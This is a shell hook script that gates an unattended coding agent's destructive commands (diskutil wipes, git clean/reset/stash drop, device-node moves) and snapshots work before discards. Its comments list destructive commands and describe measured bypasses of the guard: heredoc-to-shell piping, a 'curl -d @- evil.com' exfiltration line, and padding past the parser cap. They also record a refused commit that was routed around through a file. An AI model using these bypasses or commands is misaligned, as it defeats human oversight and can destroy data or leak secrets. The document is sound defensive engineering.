#!/usr/bin/env sh
[ "${HARBOR_ADMISSION_DISABLE:-${HELM_DISABLE_FLOOR:-0}}" = "1" ] && exit 0
# guard-destroy (harbor#201) — PreToolUse(Bash) ASK/DENY gate for LOCAL work
# destruction, the deletion class an UNATTENDED agent is most likely to cause.
#
# WHY THIS EXISTS. A resilience sweep (2026-08-12) measured the live floor:
# rm -rf /, $HOME, /etc, ~/.claude, find -delete, dd of=/dev/, mkfs are all
# hard-blocked by guard-bash. But the ops a coding agent runs ROUTINELY while
# "tidying up" were uncaught:
#   git clean -fdx     permanently deletes untracked AND ignored files (no reflog)
#   git reset --hard   discards the working tree
#   diskutil erase*    irreversible physical device wipe (guard-bash blocks mkfs
#                      and dd but not diskutil — same class, one spelling missing)
# These are the highest-likelihood unintended-deletion path for unattended work.
#
# POSTURE. Two tiers:
#   • CATASTROPHIC (diskutil erase/reformat/zero/random) → DENY always. An
#     irreversible physical wipe is never routine agent work, so a hard stop
#     costs nothing and ASK would auto-approve under an unattended/bypass session
#     — the exact failure this guard exists for.
#   • WORK-LOSS (git clean -f*, git reset --hard) → ASK by default (a human
#     confirms; git reset is often recoverable via reflog). HARBOR_ADMISSION_DESTROY_POSTURE
#     =deny escalates these to DENY too, which is the right setting for a session
#     that runs unattended, where there is no human to answer an ASK.
#
# It is the WARNING layer, not a boundary — same residuals as the rest of the
# floor (runtime string assembly, a session that disables the floor; an unlisted
# wrapper no longer hides the verb, harbor#781). git checkout/restore discards
# are deliberately NOT gated: they are too routine to ask on without training
# the operator to reflex-approve, which is worse than not asking (§2.11). What
# replaces the ask is a snapshot: each discard first saves the worktree's
# uncommitted state to refs/snapshots/ and then runs as before (harbor#1290).
#
# FAIL-OPEN AT THE ASK TIER ONLY, NOT THE CATASTROPHIC ONE (harbor#306, and this
# line used to say "like every guard"). Every rule below reads the argv table, so
# all of them used to vanish — exit 0, no output, which the harness reads as a
# clean allow — whenever floor_seg_load produced nothing: a command over
# FLOOR_MAX_NORM, awk off PATH, or floor-normalize.awk missing. The first needs no
# missing binary at all. The floor_seg_degraded block below is the backstop, and
# it carries the measurement.
set -eu
# harbor#810: no dirname fork. A failed or unresolvable $(dirname) left DIR at the cwd, sourcing ./guard-lib.sh.
case "$0" in */*) DIR="${0%/*}" ;; *) DIR=. ;; esac
DIR="$(CDPATH= cd -- "${DIR:-/}" && pwd)"
. "$DIR/guard-lib.sh"

floor_read_stdin
floor_shell_tool "$(floor_field '.tool_name')" || exit 0
CMD="$(floor_field '.tool_input.command')"
[ -n "$CMD" ] || exit 0
# The digest subject (harbor#350). Set here for the same reason guard-bash.sh:39
# does it — payload text that never enters floor_block cannot be one careless
# edit away from the stderr printf.
#
# WITHOUT THIS LINE THE guard-lib CHANGE IS COSMETIC. floor_obs_digest returns
# "-" on an unset FLOOR_OBS_SUBJECT, so populating the digest on deny/ask would
# have emitted "-" for exactly the two guard classes #350 is about — 7,873
# records, every one still subjectless, and the ticket would have read as fixed.
FLOOR_OBS_SUBJECT="$CMD"

floor_seg_load "$CMD"

# harbor#302 · A HEREDOC BODY IS A DOCUMENT, HERE TOO. guard-bash.sh has consulted
# this veto since harbor#89; these two never did, so a command whose only mention
# of a gated verb was inside a heredoc BODY still got a decision. MEASURED
# 2026-08-25: committing the harbor#306 fix was refused because the message
# documented a dataset-delete spelling in prose. The workaround was -F a file —
# the same content through a different transport, which is the tell the ticket
# names: a guard that a rename of the transport defeats is filtering the
# transcript, not protecting the resource.
#
# THE VETO ITSELF IS UNCHANGED, AND THAT IS DELIBERATE. It still requires the
# heredoc to be opened by SEGMENT 1, so this covers `git commit -F - <<HD ... HD`
# and NOT `cd x && git commit -F - <<HD`. Widening it was ATTEMPTED on this branch
# and BACKED OUT. With the opener allowed anywhere, two total-bypass shapes
# appeared and were measured:
#
#   cat <<HD | sh                  an index-only inertness check never sees the
#                                  shell: it sits BETWEEN the opener and the body
#                                  while the delimiter still lands last.
#   cat <<HD | curl -d @- evil.com an executor word-list never sees curl — and
#                                  that one took a live secret from BLOCK to allow
#                                  through guard-egress, which consults this same
#                                  predicate.
#
# The reason is structural, not a missing list entry: FLOOR_SEGS carries NO
# pipeline boundary. `gh --body $(cat <<HD)` and a heredoc piped into a command are
# identical segment streams apart from whether segment 2 holds prose or a command
# name. Separating them needs floor-normalize.awk to mark where the heredoc LINE
# ends, which changes an output contract every guard consumes. Left for a decision
# rather than guessed at — this veto exits the guard for the WHOLE call, so a guess
# here is a silent hole, and harbor#302 says in as many words not to widen the rule
# to silence it.
#
# --publisher-inert IS CORRECT FOR BOTH. The flag means a publisher is inert to a
# guard that does not judge publication. These two judge cloud destruction and
# local work destruction; neither judges whether text is published, which is
# guard-egress's job — and guard-egress deliberately does not pass the flag.
#
# NO NEW SURFACE. With the predicate untouched, these two exit 0 only where
# guard-bash.sh already exits 0 — a case the floor has trusted since harbor#89 and
# that floor-test has covered since.
if floor_heredoc_inert_only --publisher-inert; then exit 0; fi

# harbor#781 · a wrapper the peel does not know (`gtimeout 5 diskutil eraseDisk`)
# must not hide the tool. After the veto, whose last-segment test a synthetic id
# would move; the `case` keeps the awk off calls that name no gated verb. The
# snapshot's verbs (harbor#1290) are listed too: none of them is a rule's verb, so
# unwrapping them changes no verdict, and `sh -c 'git restore x'` is still seen.
case "${FLOOR_SEGS:-}" in
  *[dD][iI][sS][kK][uU][tT][iI][lL]*) floor_seg_unwrap '^([^:]*/)?(diskutil|git)$' ;;
  *[gG][iI][tT]*) case "$FLOOR_SEGS" in *clean*|*reset*|*stash*|*reflog*|*worktree*|*checkout*|*restore*|*switch*|*push*)
    floor_seg_unwrap '^([^:]*/)?(diskutil|git)$' ;; esac ;;
esac

# harbor#1313 · DEVICE-NODE REPLACE → ask (operator decision 2026-10-18). mv or
# install with a raw /dev disk node as an operand does not write the disk; it
# replaces the node (a cross-device create) or, moving one OUT of /dev, removes
# it — in both cases the node is gone and must be recreated by mknod/udev. The
# device-content writers (dd, redirect, tee, mkfs and the harbor#1313 wipe
# verbs) live in guard-bash and deny; node replacement is a weaker, recoverable
# act the operator chose to ASK on, so it sits here beside the git work-loss
# asks (and escalates to deny with no human, like them). Root-only and absent on
# macOS, blocked anyway (docs/explanation/admission-baseline.md B-sd-3). Each operand is expanded and its
# ./ // ../ collapsed first, so `/dev/shm/../sda` reads as the `/dev/sda` it
# resolves to and a `-t /dev` target directory is seen; a mv/install that names
# no device node is untouched.
dev_node_replace() {
  case "${FLOOR_SEGS:-}" in *[mM][vV]*|*[iI][nN][sS][tT][aA][lL][lL]*) ;; *) return 1 ;; esac
  _dnr_re='/dev/(sd|hd|vd|xvd|nvme|disk|rdisk|mmcblk|loop|dm-|mapper/|md[0-9])|^/dev/?$'
  for _dnr_id in $(_floor_seg_ids '^([a-zA-Z0-9_./-]*/)?(mv|install)$' ci); do
    printf '%s\n' "$FLOOR_SEGS" | sed -n "s/^SEGA:${_dnr_id}://p" \
      | while IFS= read -r _dnr_t; do floor_collapse_dots "$(floor_expand_paths "$_dnr_t")"; echo; done \
      | "$FLOOR_GREP" -Eq -- "$_dnr_re" && return 0
  done
  return 1
}

REASON=""; DECISION=""; RULE=""; SHAPE="argv"
# --- CATASTROPHIC: irreversible device wipe → deny, always ------------------
if floor_seg_has '^([^:]*/)?diskutil$' '^erase|^secureErase$|^reformat$|^zeroDisk$|^randomDisk$|^partitionDisk$|^deleteContainer$|^deleteVolume'; then
  DECISION="deny"; RULE="diskutil-wipe"; REASON="diskutil device/volume wipe — IRREVERSIBLE physical destruction"
# --- WORK-LOSS: git ops that destroy the working tree or its recovery net → ask
elif floor_seg_has '^([^:]*/)?git$' '^clean$' '^--force$|^-[a-zA-Z]*f[a-zA-Z]*$'; then
  DECISION="ask";  RULE="git-clean-force"; REASON="git clean -f permanently deletes untracked/ignored files (no reflog)"
# git takes any unambiguous prefix of a long flag, and --h is already --hard (harbor#1313).
elif floor_seg_has '^([^:]*/)?git$' '^reset$' '^--h(a(rd?)?)?$'; then
  DECISION="ask";  RULE="git-reset-hard"; REASON="git reset --hard discards the working tree"
elif floor_seg_has '^([^:]*/)?git$' '^stash$' '^clear$|^drop$'; then
  DECISION="ask";  RULE="git-stash-drop"; REASON="git stash clear/drop deletes stashed work (not in the branch reflog)"
elif floor_seg_has '^([^:]*/)?git$' '^reflog$' '^expire$'; then
  DECISION="ask";  RULE="git-reflog-expire"; REASON="git reflog expire destroys the recovery net reset/branch-D rely on"
elif floor_seg_has '^([^:]*/)?git$' '^worktree$' '^remove$' '^--force$|^-[a-zA-Z]*f[a-zA-Z]*$'; then
  DECISION="ask";  RULE="git-worktree-remove-force"; REASON="git worktree remove --force discards a worktree's uncommitted work"
elif dev_node_replace; then
  DECISION="ask";  RULE="device-node-replace"; REASON="mv/install with a raw /dev disk node as an operand replaces or removes the device node (harbor#1313)"
fi

# --- THE ARGV LAYER WENT BLIND: deny-always must not degrade to allow -------
# harbor#306. Every rule above is floor_seg_has, so all of them vanish when
# floor_seg_load produces no table — with exit 0 and no output, which the harness
# reads as a clean allow. MEASURED: 'diskutil eraseDisk' padded with a 33,000-byte
# trailing comment was a SILENT ALLOW, while guard-bash.sh denied the identically
# padded 'rm -rf /' because its rules also run through the flat layer. Same silent
# allow with awk off PATH, and with floor-normalize.awk deleted.
#
# THE BACKSTOP IS THE TOOL NAME, NOT A SECOND COPY OF THE RULES. Mirroring each
# catastrophic rule as a flat ERE is the obvious repair and it is the wrong one:
# it puts two spellings of one rule in one file, and a copy drifts silently while
# reading correctly (CONSTITUTION, "derive it"). So this asks the only question it
# can answer without the tokenizer — does the executed text name the tool whose
# verbs are deny-always — and reports that it cannot tell a wipe from a `list`.
#
# DENY, AND THE FALSE-POSITIVE COST IS MEASURED, NOT ASSUMED. Over 14,505 real
# Bash commands in this box's transcript store, ONE (0.0069%) exceeded
# FLOOR_MAX_NORM at all, and the longest was 33,766 B. So the population this can
# fire wrongly on is ~1 in 14,000 commands, each of which gets a legible reason and
# two remedies. §2.11 asks for an ordinary-work case that stays green: every
# parseable `diskutil` call still reaches the rules above, including
# 'diskutil list', because a parseable call is not degraded.
#
# THE ASK TIER IS DELIBERATELY NOT HERE. `git` appears in enormous commands
# constantly in this repo, and a work-loss ask is the tier where fail-open is the
# considered §2.11 choice. Widening this to `git` would trade a measured 0.0069%
# for a routine one, to harden the tier that was never the finding.
#
# jq ABSENT IS A DIFFERENT MODE AND IS ALREADY COVERED — one layer up, not here.
# Without jq, CMD is empty and this guard exits above; but guard-bash.sh is wired
# on the SAME PreToolUse(Bash) matcher THROUGH floor-hook.sh, whose jq canary
# exits 2, so the call is denied before any of this matters. Verified both ways in
# destroy-guard-test.sh rather than left as a layering argument, which is how
# QA-PLAN's R9 row came to sign off a backstop that did not exist for this tier.
if [ -z "$DECISION" ] && floor_seg_degraded; then
  # floor_bash_targets is called ONLY here. It forks awk, this runs on every Bash
  # call, and the whole point of the allow path is that it stays cheap — so the
  # cost is paid in the branch that has already established something is wrong.
  # Over the cap it returns the raw command, which is exactly what is needed.
  _DT="$(floor_bash_targets "$CMD")"
  if printf '%s' "$_DT" | "$FLOOR_GREP" -iEq -- '(^|[^[:alnum:]_./-])([a-zA-Z0-9_./-]*/)?diskutil([[:space:]]|$)'; then
    DECISION="deny"; RULE="argv-blind-diskutil"; SHAPE="flat"
    REASON="the argv tokenizer could not parse this call (over the ${FLOOR_MAX_NORM}-byte normalizer cap, nested past what the normalizer expands, or awk/floor-normalize.awk unavailable) and the command names diskutil, whose erase/reformat/zero verbs are deny-always — so the guard cannot tell an IRREVERSIBLE device wipe from a diskutil list. Re-run it under the cap, or the operator runs it themselves as a \`!\` command, which is not a tool call"
  fi
fi

# --- harbor#1290 · A DISCARD SNAPSHOTS UNCOMMITTED WORK FIRST -----------------
# A checkout or restore with a pathspec, a hard or merge reset, a forced checkout
# or switch and a forced clean are let through (checkout/restore ungated, reset
# and clean at their ask), so a discard of another session's edit was final. Before
# one runs, the worktree it acts on (the call's .cwd, folded through cd/pushd and
# -C) is written to refs/snapshots/<epoch>-<pid>: a temp index copied from the
# real one, add -A (tracked changes and untracked NON-ignored files), write-tree,
# commit-tree on HEAD. The real index is never written; a clean tree takes no
# snapshot; a branch switch takes none. Refs older than 7 days go when the next
# one is written. Nothing here refuses a discard: a failure is one stderr line
# stamped [check:destroy-snapshot]. The one refusal is a push that would publish
# refs/snapshots. Contract, recovery and limits: docs/explanation/admission-baseline.md, harbor#1290.
_snap_plan() { # stdout rows: SNAP|MAYBE|PUSH <tab> <dir> <tab> <verb|arg|explicit>, or BLIND <tab> <verb> <tab> <why>
  # NO APOSTROPHES IN THIS PROGRAM: it is a single-quoted shell string.
  { printf 'CWD:%s\n' "$(floor_field '.cwd')"; printf '%s\n' "$FLOOR_SEGS"; } | awk -v home="$HOME" '
    function norm(p,   n, i, a, out, k, lead, r) {
      lead = (substr(p, 1, 1) == "/"); n = split(p, a, "/"); k = 0
      for (i = 1; i <= n; i++) {
        if (a[i] == "" || a[i] == ".") continue
        if (a[i] == "..") { if (k > 0) k--; continue }
        out[++k] = a[i]
      }
      r = ""; for (i = 1; i <= k; i++) r = r ((i == 1 && !lead) ? "" : "/") out[i]
      return (r == "") ? (lead ? "/" : "") : r
    }
    # The cd-fold resolve of floor_seg_cwd_under, lexical: a substitution, a variable or a glob is unknown.
    function resolve(t, c) {
      if (t == "~" || t == "$HOME" || t == "${HOME}") return home
      if (substr(t, 1, 2) == "~/") return norm(home substr(t, 2))
      if (substr(t, 1, 6) == "$HOME/") return norm(home substr(t, 6))
      if (substr(t, 1, 8) == "${HOME}/") return norm(home substr(t, 8))
      if (index(t, "@SUB@") || index(t, "$") || index(t, "`") || t ~ /[*?]/ || substr(t, 1, 1) == "~") return ""
      if (substr(t, 1, 1) == "/") return norm(t)
      return (c == "") ? "" : norm(c "/" t)
    }
    function base(t) { sub(/.*\//, "", t); return tolower(t) }
    function short(t, ch) { return (t ~ /^-[a-zA-Z0-9]+$/ && index(substr(t, 2), ch) > 0) }
    function emit(kind, d, x) {
      if (kind == "PUSH" && x == 0 && (BL != "" || d == "")) return
      if (BL != "") { print "BLIND\t" VERB "\t" BL; return }
      if (d == "") { print "BLIND\t" VERB "\tthe folder it runs in is unknown"; return }
      print kind "\t" d "\t" x
    }
    function gitseg(i,   k, n, t, d, np, P, disc, dd, after, made, st, wt, force, dry) {
      n = N[i]; d = cwd; BL = (i in GE) ? "a GIT_DIR or GIT_WORK_TREE assignment moves it" : ""
      for (k = 1; k <= n; k++) {
        t = A[i, k]
        if (t == "-C") { k++; d = resolve(A[i, k], d); continue }
        if (t == "-c" || t == "--namespace" || t == "--config-env" || t == "--attr-source") { k++; continue }
        if (t == "--git-dir" || t == "--work-tree") { k++; BL = "it names --git-dir or --work-tree"; continue }
        if (t ~ /^--(git-dir|work-tree)=/) { BL = "it names --git-dir or --work-tree"; continue }
        if (substr(t, 1, 1) == "-") continue
        break
      }
      if (k > n) return
      VERB = A[i, k]
      if (VERB == "checkout") {
        np = 0; disc = 0; dd = 0; after = 0; made = 0
        for (k++; k <= n; k++) {
          t = A[i, k]
          if (dd) { after++; continue }
          if (t == "--") { dd = 1; continue }
          if (t == "-b" || t == "-B" || t == "--orphan") { made = 1; k++; continue }
          if (t ~ /^--(force|ours|theirs|patch|merge|pathspec-from-file)(=|$)/) { disc = 1; continue }
          if (t ~ /^-[a-zA-Z0-9]+$/) {
            if (short(t, "f") || short(t, "p") || short(t, "m")) disc = 1
            if (short(t, "b") || short(t, "B")) { made = 1; k++ }
            continue
          }
          if (substr(t, 1, 1) == "-") continue
          P[++np] = t
        }
        # One bare operand is a branch OR a path, which only the repository can say: MAYBE.
        if (disc || after > 0 || np >= 2) emit("SNAP", d, VERB)
        else if (np == 1 && !made && P[1] != "-") emit("MAYBE", d, P[1])
      } else if (VERB == "switch") {
        disc = 0
        for (k++; k <= n; k++) {
          t = A[i, k]
          if (t == "-c" || t == "-C" || t == "--create" || t == "--force-create" || t == "--orphan") { k++; continue }
          if (t ~ /^--(force|discard-changes|merge)$/ || short(t, "f") || short(t, "m")) disc = 1
        }
        if (disc) emit("SNAP", d, VERB)
      } else if (VERB == "restore") {
        st = 0; wt = 0
        for (k++; k <= n; k++) {
          t = A[i, k]
          if (t == "-s" || t == "--source") { k++; continue }
          if (t == "--staged" || short(t, "S")) st = 1
          if (t == "--worktree" || short(t, "W")) wt = 1
        }
        if (!st || wt) emit("SNAP", d, VERB)   # --staged alone rewrites only the index
      } else if (VERB == "reset") {
        # Abbreviations too, as the ask reads them: --h.. for --hard, --me.. for --merge (harbor#1313).
        for (k++; k <= n; k++) if (A[i, k] ~ /^--h(a(rd?)?)?$/ || A[i, k] ~ /^--me(r(ge?)?)?$/) { emit("SNAP", d, VERB); break }
      } else if (VERB == "clean") {
        force = 0; dry = 0
        for (k++; k <= n; k++) {
          t = A[i, k]
          if (t == "-e" || t == "--exclude") { k++; continue }
          if (t == "--force" || short(t, "f")) force = 1
          if (t == "--dry-run" || t == "--interactive" || short(t, "n") || short(t, "i")) dry = 1
        }
        if (force && !dry) emit("SNAP", d, VERB)
      } else if (VERB == "push") {
        force = 0
        for (k++; k <= n; k++) {
          t = A[i, k]
          if (t == "--mirror" || t ~ /(^|[+:]|refs\/)snapshots\// || t ~ /^\+?refs\/\*/ || t ~ /^\+?\*/) force = 1
        }
        emit("PUSH", d, force)
      }
    }
    function sid(s,   p) { p = index(s, ":"); V = substr(s, p + 1); return substr(s, 1, p - 1) + 0 }
    /^CWD:/  { c0 = substr($0, 5); next }
    /^SEGW:/ { i = sid(substr($0, 6)); if (V ~ /^GIT_(DIR|WORK_TREE|INDEX_FILE|COMMON_DIR)=/) GE[i] = 1; next }
    /^SEGC:/ { i = sid(substr($0, 6)); C[i] = V; if (i > M) M = i; next }
    /^SEGA:/ { i = sid(substr($0, 6)); N[i]++; A[i, N[i]] = V; if (i > M) M = i; next }
    /^SEGR:/ { i = sid(substr($0, 6)); if (substr(V, 1, 3) == "<<:") { h = substr(V, 4); sub(/^-/, "", h); H[i] = h }; next }
    END {
      cwd = (substr(c0, 1, 1) == "/") ? norm(c0) : ""
      delim = ""
      for (i = 1; i <= M; i++) {
        if (!(i in C)) continue
        # A heredoc body is data until its delimiter, as in inject-hook shell_targets.
        if (delim != "") { if (C[i] == delim) delim = ""; continue }
        w = base(C[i])
        if (w == "cd" || w == "pushd") {
          t = ""; got = 0
          for (k = 1; k <= N[i]; k++) {
            if (A[i, k] == "" || A[i, k] == "--" || A[i, k] ~ /^-[LPen@]+$/) continue
            t = A[i, k]; got = 1; break
          }
          if (!got) cwd = (w == "cd") ? home : ""
          else if (t == "-" || t ~ /^[-+][0-9]+$/) cwd = ""
          else cwd = resolve(t, cwd)
        } else if (w == "popd") cwd = ""
        else if (w == "git") gitseg(i)
        if (i in H) delim = H[i]
      }
    }' 2>/dev/null
}

_snap_say() { # <text> — the one stderr line a call gets, however many worktrees it touched
  [ -z "${_SNAP_SAID:-}" ] || return 0
  _SNAP_SAID=1
  printf '[check:destroy-snapshot] guard-destroy: %s (harbor#1290)\n' "$1" >&2
}

# _snap_take <dir> <verb> — snapshot the worktree holding <dir>. Silent when <dir> is in no worktree
# (nothing to save), when the tree matches HEAD, or when <common git dir>/harbor-snapshot-off exists.
# Every fork here is paid on each discard of a dirty tree, so values are read with `read`, never sed.
_snap_take() {
  _st_top=""; _st_cd=""; _st_idx=""; _st_tmp=""; _st_ht=""; _st_head=""
  _st_r="$(git -C "$1" rev-parse --show-toplevel --git-common-dir --git-path index --git-path "harbor-snapshot.$$" 'HEAD^{tree}' HEAD 2>/dev/null)" \
    || _st_r="$(git -C "$1" rev-parse --show-toplevel --git-common-dir --git-path index --git-path "harbor-snapshot.$$" 2>/dev/null)" \
    || return 0
  { read -r _st_top; read -r _st_cd; read -r _st_idx; read -r _st_tmp; read -r _st_ht; read -r _st_head; } <<SNAP_EOF
$_st_r
SNAP_EOF
  [ -n "$_st_top" ] && [ -n "$_st_tmp" ] || return 0
  case "$_SNAP_TOPS" in *"
$_st_top
"*) return 0 ;; esac
  _SNAP_TOPS="$_SNAP_TOPS$_st_top
"
  case "$_st_cd" in /*) ;; *) _st_cd="$1/$_st_cd" ;; esac
  case "$_st_idx" in /*) ;; *) _st_idx="$1/$_st_idx" ;; esac
  case "$_st_tmp" in /*) ;; *) _st_tmp="$1/$_st_tmp" ;; esac
  [ ! -e "$_st_cd/harbor-snapshot-off" ] || return 0
  # The copy keeps the stat cache, so add rehashes only what changed. -p keeps the index mtime, which
  # git's racy-entry check compares against: a fresh mtime hid a same-second, same-size edit.
  if [ -f "$_st_idx" ]; then cp -p "$_st_idx" "$_st_tmp.index" 2>/dev/null || { rm -f "$_st_tmp.index"; _snap_say "could not snapshot $_st_top before git $2: its git dir is not writable — the command runs unprotected"; return 0; }; fi
  # NO SIZE CAP, AND THAT IS A MEASURED CHOICE: a cap needs an untracked listing and a stat pass,
  # +45 ms at load 16 on harbor, more than the whole budget. A large untracked file that is not
  # ignored is rehashed on each discard; docs/explanation/admission-baseline.md (harbor#1290) names the remedy, .gitignore it.
  _st_tree=""
  GIT_INDEX_FILE="$_st_tmp.index" git -C "$_st_top" add -A >/dev/null 2>&1 \
    && _st_tree="$(GIT_INDEX_FILE="$_st_tmp.index" git -C "$_st_top" write-tree 2>/dev/null)"
  rm -f "$_st_tmp.index" "$_st_tmp.index.lock"
  [ -n "$_st_tree" ] || { _snap_say "could not snapshot $_st_top before git $2: writing its objects failed (unwritable repository?) — the command runs unprotected"; return 0; }
  [ "$_st_tree" != "$_st_ht" ] || return 0   # nothing uncommitted: no snapshot to keep
  case "$_st_tree" in 4b825dc642cb6eb9a060e54bf8d69288fbee4904|6ef19b41225c5369f1c104d45d8d85efa9b057b53b14b4b9b939dd74decc5321) [ -n "$_st_head" ] || return 0 ;; esac
  _st_c="$(GIT_AUTHOR_NAME=harbor-snapshot GIT_AUTHOR_EMAIL=snapshot@harbor.invalid \
           GIT_COMMITTER_NAME=harbor-snapshot GIT_COMMITTER_EMAIL=snapshot@harbor.invalid \
           git -C "$_st_top" commit-tree --no-gpg-sign ${_st_head:+-p "$_st_head"} -m "harbor snapshot before git $2" \
             -m "worktree: $_st_top" -m "command: $CMD" "$_st_tree" 2>/dev/null)" \
    || { _snap_say "could not snapshot $_st_top before git $2: commit-tree failed — the command runs unprotected"; return 0; }
  # One update-ref writes the new ref and drops every snapshot older than 7 days; awk srand() is the clock.
  git -C "$_st_top" for-each-ref --format='%(committerdate:unix) %(refname)' refs/snapshots/ 2>/dev/null \
    | awk -v c="$_st_c" -v p="$$" 'BEGIN { srand(); now = srand(); print "create refs/snapshots/" now "-" p " " c }
        $1 + 0 < now - 604800 { print "delete " $2 }' \
    | git -C "$_st_top" update-ref --stdin 2>/dev/null \
    || { _snap_say "could not snapshot $_st_top before git $2: the ref could not be written — the command runs unprotected"; return 0; }
  return 0
}

# _snap_push <dir> <explicit> — 0 iff this push would publish refs/snapshots: the repo holds some, and
# the call names --mirror or a refs/* or refs/snapshots refspec, or a remote is configured to mirror them.
_snap_push() {
  [ -n "$(git -C "$1" for-each-ref --count=1 --format=x refs/snapshots/ 2>/dev/null)" ] || return 1
  [ "$2" = 1 ] && return 0
  git -C "$1" config --get-regexp '^remote\..*\.(mirror|push)$' 2>/dev/null \
    | "$FLOOR_GREP" -Eq -- '\.mirror[[:space:]]+true$|[[:space:]]\+?(refs/\*|refs/snapshots|\*)'
}

_SNAP_TOPS="
"
_snap_run() {
  _sp="$(_snap_plan)" || return 0
  [ -n "$_sp" ] || return 0
  _stab="$(printf '\t')"
  while IFS="$_stab" read -r _sk _sd _sx; do
    case "$_sk" in
      PUSH) if _snap_push "$_sd" "$_sx"; then
              DECISION="deny"; RULE="git-push-snapshots"; _PLAIN=1
              REASON="this push would publish refs/snapshots/* from $_sd — local-only copies of uncommitted work that can hold untracked secrets such as a .env (harbor#1290). Push named branches instead, or drop the snapshots first: git -C $_sd for-each-ref --format='delete %(refname)' refs/snapshots/ | git -C $_sd update-ref --stdin"
            fi ;;
      BLIND) if [ "$_sd" = push ]; then
               DECISION="deny"; RULE="git-push-snapshots"; _PLAIN=1
               REASON="this push names --mirror or a refs/* refspec, and the guard cannot tell which repository it runs in ($_sx), so it cannot rule out publishing refs/snapshots/* — local-only copies of uncommitted work (harbor#1290). Run it with git -C <absolute path>, or push named branches"
             fi ;;
    esac
  done <<SNAP_EOF
$_sp
SNAP_EOF
  [ "$DECISION" != deny ] || return 0
  # The hook's environment is not the command's: a GIT_* the harness carries must not pick the repository.
  # No subshell (a fork per discard): -e is already off here, because the only caller runs this under ||.
  unset GIT_DIR GIT_WORK_TREE GIT_INDEX_FILE GIT_COMMON_DIR GIT_OBJECT_DIRECTORY GIT_ALTERNATE_OBJECT_DIRECTORIES GIT_NAMESPACE GIT_PREFIX
  while IFS="$_stab" read -r _sk _sd _sx; do
    case "$_sk" in
      SNAP) _snap_take "$_sd" "$_sx" ;;
      MAYBE) # a branch, a tag or a remote branch git would DWIM is a switch, never a discard
        git -C "$_sd" rev-parse -q --verify "$_sx^{commit}" >/dev/null 2>&1 && continue
        [ -z "$(git -C "$_sd" for-each-ref --count=1 --format=x "refs/remotes/*/$_sx" 2>/dev/null)" ] || continue
        _snap_take "$_sd" checkout ;;
      BLIND) [ "$_sd" = push ] || _snap_say "nothing was snapshotted before git $_sd: $_sx" ;;
    esac
  done <<SNAP_EOF
$_sp
SNAP_EOF
  return 0
}

_PLAIN=""
if [ "$DECISION" != deny ] && [ -n "${FLOOR_SEGS:-}" ]; then
  case "$FLOOR_SEGS" in *[gG][iI][tT]*)
    case "$FLOOR_SEGS" in *checkout*|*restore*|*reset*|*switch*|*clean*|*push*) _snap_run || : ;; esac ;;
  esac
fi

[ -n "$DECISION" ] || exit 0   # no destructive op — allow

# Unattended hardening. An ASK auto-approves where no human can answer it
# (MEASURED 2026-08-13: a subagent's flagged command executed with no prompt), so
# escalate the ask tier to deny when EITHER the operator set the posture OR
# floor_no_human detects a subagent/workflow/autonomous caller automatically. The
# catastrophic tier already denies. Fail-safe toward "human present" — the
# interactive main-loop ask is untouched (see guard-lib floor_no_human).
_NHNOTE=""
if [ "$DECISION" = "ask" ]; then
  if [ "${HARBOR_ADMISSION_DESTROY_POSTURE:-${HELM_DESTROY_POSTURE:-ask}}" = "deny" ]; then DECISION="deny"
  elif floor_no_human; then DECISION="deny"; _NHNOTE=" [no-human context — an ask would auto-approve here, so escalated to deny]"
  fi
fi

# THE TAIL IS PER SHAPE, because the argv tail is FALSE for the degraded block:
# "diskutil list/info are never gated" stops being true the moment the tokenizer
# cannot see which verb it is, and a reason that misdescribes its own block sends
# the reader looking for a rule that did not fire.
if [ "$SHAPE" = "flat" ] || [ -n "$_PLAIN" ]; then  # _PLAIN: the push rule is no work-loss ask
  MSG="$REASON."
else
  MSG="$REASON. Confirm a HUMAN intends this — an unattended agent should not destroy uncommitted or untracked work. Non-destructive forms (git clean -n, git reset --soft, diskutil list/info) are never gated.$_NHNOTE"
fi

printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":%s}}\n' \
  "$DECISION" "$(printf '%s' "$MSG" | jq -Rs .)"

# `destroy.$DECISION` named the rule `destroy` for every op and put the verdict in
# the SHAPE slot, where the enum coerced it to `meta` — so the verdict was stored
# twice (it is already the `d` field) and WHICH op fired was not stored at all.
# The per-branch RULE token above is what makes "rules that fired" answerable here.
#
# THE SHAPE IS NOW A VARIABLE, not the literal `argv`. The degraded block above
# reaches its verdict through the flat layer, and hard-coding `argv` would file it
# under the layer that was blind at the time — making the one record that says
# "the tokenizer failed here" indistinguishable from the rules that work.
{ floor_log_decision destroy "$DECISION" "${RULE:-unclassified}.$SHAPE" 2>/dev/null || :; } 2>/dev/null || :
exit 0
